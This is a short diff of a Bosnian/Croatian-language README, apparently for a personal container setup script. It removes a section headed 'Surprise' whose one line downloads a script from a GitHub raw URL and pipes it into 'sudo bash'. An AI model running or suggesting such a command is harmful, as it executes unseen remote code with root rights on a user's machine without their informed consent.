@@ -66,10 +66,6 @@ Ovime se automatizira navođenje source-a svaki put kada se kontejner pokrene, t
 ```
 source /opt1/script.sh
 ```
-## Surprise:
-```
-wget -q -O- https://raw.githubusercontent.com/kenandervisagic/vim-dark-mode/main/vim-dark-kenan/install_funky | sudo bash
-```
 
 Program je za ličnu upotrebu. 
 
